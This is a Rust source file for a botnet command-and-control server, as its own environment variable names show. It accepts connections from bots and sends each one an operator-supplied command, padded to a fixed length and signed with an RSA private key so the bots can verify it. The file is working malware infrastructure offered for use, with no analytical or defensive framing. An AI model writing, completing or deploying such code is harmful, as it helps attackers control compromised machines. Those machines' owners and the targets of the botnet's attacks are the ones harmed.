use tokio::net::{TcpStream, TcpListener};
use std::error::Error;
use std::sync::{Arc, Mutex};
use std::env;
use tokio::io::{AsyncWriteExt, AsyncReadExt};
use tokio::time::{sleep, Duration};
use rsa::RsaPrivateKey;
use rsa::pkcs1v15::{SigningKey, Signature};
use rsa::signature::{RandomizedSigner, SignatureEncoding, Verifier};
use rsa::sha2::{Digest, Sha256};
use rsa::pkcs1::DecodeRsaPrivateKey;
use std::collections::HashSet;
use std::net::SocketAddr;
use rand;


#[tokio::main]
async fn main() -> Result<(), Box<dyn Error>> {
    let listener = TcpListener::bind(env::var("BOTNET_LISTENIP").expect("Env variable BOTNET_LISTENIP not set. This should be set with the listening port as well, ie 127.0.0.1:8000")).await?;
    let mut unique_connections: HashSet<SocketAddr> = HashSet::new();

    let args: Arc<Mutex<Vec<String>>> = Arc::new(Mutex::new(std::env::args().collect()));

    let private_key = RsaPrivateKey::from_pkcs1_pem(&env::var("BOTNET_PRIVATEPEM").expect("Env variable BOTNET_PRIVATEPEM not set. This should be set to the private key pem of your pkcs1 keypair.")).expect("Could not get private key");
    let signing_key: Arc<Mutex<SigningKey<Sha256>>> = Arc::new(Mutex::new(SigningKey::<Sha256>::new(private_key)));

    let mut conns = 0;
    loop {
        let (socket, peer_addr) = listener.accept().await?;

        let a = Arc::clone(&args);
        let s = Arc::clone(&signing_key);
        tokio::spawn(async move {

            handle_conn(socket, a, s).await;

        });
    }
}

async fn handle_conn(mut stream: TcpStream, args: Arc<Mutex<Vec<String>>>, signing_key: Arc<Mutex<SigningKey<Sha256>>>) {

    let (mut reader, mut writer) = stream.split();

    // The client will be sending data to the server first
    
    let mut buf = vec![0u8; 1024];

    let n = reader.read(&mut buf).await.expect("Failed to read from reader");
    println!("Message: {}", String::from_utf8_lossy(&buf[..n]));

    let arg;
    {
        arg = args.lock().unwrap().get(1).expect("No Args Provided").clone();
    }


    // So, we want to write exactly 1024 bytes every time so that we can trust the client to do the
    // same. If not, and this value is arbitrary, the client by read the signature into the wrong
    // buffer and fuck everything
    
    // Set to all zeros

    for (index, val) in buf.iter_mut().enumerate() {
        *val = 0;
    }

    arg.into_bytes().iter().enumerate().for_each(|(index, &val)| {
        buf[index] = val;
    });

    let signed_message;
    {
        let signing_key = signing_key.lock().unwrap();
        let mut rng = rand::thread_rng();
        signed_message = signing_key.sign_with_rng(&mut rng, &buf[..]).to_bytes();
    }


    writer.write_all(&buf[..]).await.expect("Writer failed to write");
    writer.write_all(&signed_message[..]).await.expect("Writer failed to write");

    writer.shutdown().await;
}
